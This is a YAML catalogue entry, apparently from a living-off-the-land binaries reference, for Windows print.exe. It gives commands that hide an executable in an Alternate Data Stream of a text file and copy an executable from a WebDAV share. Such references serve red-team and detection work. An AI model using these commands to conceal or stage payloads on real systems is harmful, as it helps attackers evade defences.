---
name: print.exe
description: Used by Windows to send files to the printer.
functions:
  ads:
    - description: Copy file.exe into the Alternate Data Stream (ADS) of file.txt.
      code: print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe
  copy:
    - description: Copy FileToCopy.exe to the target C:\ADS\CopyOfFile.exe
      code: print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe
    - description: Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.
      code: print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe
resources: 
    - resource: https://twitter.com/Oddvarmoe/status/985518877076541440
    - resource: https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410
fullpath: 
    - path: c:\windows\system32\print.exe
    - path: c:\windows\sysWOW64\print.exe
notes:
---